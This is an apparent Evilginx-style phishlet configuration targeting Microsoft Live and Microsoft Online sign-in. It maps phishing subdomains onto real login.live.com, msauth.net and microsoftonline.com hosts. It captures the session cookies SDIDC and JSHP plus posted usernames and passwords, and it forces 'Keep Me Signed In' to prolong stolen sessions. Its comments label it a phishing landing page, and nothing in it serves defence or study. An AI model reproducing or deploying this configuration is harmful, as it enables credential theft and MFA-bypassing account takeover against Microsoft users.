name: 'microsoft'
author: 'anon'
min_ver: '3.0.0'

proxy_hosts:
  # Primary login page for Microsoft Live.
  - {phish_sub: 'login', orig_sub: 'login', domain: 'live.com', session: true, is_landing: true, auto_filter: true}
  # CDN for authentication resources.
  - {phish_sub: 'cdn', orig_sub: 'logincdn', domain: 'msauth.net', session: true, is_landing: false, auto_filter: true}
  # Account management on live.com.
  - {phish_sub: 'account', orig_sub: 'account', domain: 'live.com', session: true, is_landing: false, auto_filter: true}
  # Microsoft main site (session=false as backup support).
  - {phish_sub: 'microsoft', orig_sub: 'account', domain: 'microsoft.com', session: false, is_landing: false, auto_filter: true}
  # Login for Microsoft Online business accounts.
  - {phish_sub: 'login.microsoftonline', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: false, auto_filter: true}
  # www.microsoft.com for access to other Microsoft services.
  - {phish_sub: 'www', orig_sub: 'www', domain: 'microsoft.com', session: true, is_landing: false, auto_filter: true}

auth_tokens:
  # Capturing session cookies from login.live.com.
  - domain: '.login.live.com'
    keys: ['SDIDC', 'JSHP']
    type: 'cookie'

credentials:
  # Capturing username and password.
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'

force_post:
  # Forcing "Keep Me Signed In".
  - path: '/ppsecure/post.srf'
    search:
      - {key: 'login', search: '.*'}
      - {key: 'passwd', search: '.*'}
    force:
      - {key: 'KMSI', value: 'on'}
    type: 'post'

login:
  # Landing page for phishing.
  domain: 'login.live.com'
  path: 'login.srf'
